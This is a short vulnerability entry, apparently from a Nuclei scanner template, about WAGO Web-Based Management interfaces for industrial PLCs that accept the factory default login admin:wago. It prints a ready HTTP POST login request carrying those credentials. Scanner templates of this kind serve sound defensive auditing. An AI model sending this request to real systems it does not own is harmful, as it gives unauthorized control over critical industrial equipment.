# Nuclei Template: WAGO Web based Management - Default Login
**Template ID:** wago-webbased-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`wago-webbased-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Identified WAGO Web-Based Management interfaces that were accessible using default credentials (admin:wago).These interfaces are used to configure and monitor WAGO programmable logic controllers (PLCs) and automation systems. Use of factory-default credentials exposed critical OT infrastructure to unauthorized access.

## Steps to reproduce / Exploit Payload
```http
POST /wbm/login.php HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Origin: {{RootURL}}
Referer: {{RootURL}}/wbm/index.php

{"username":"admin","password":"wago"}
```

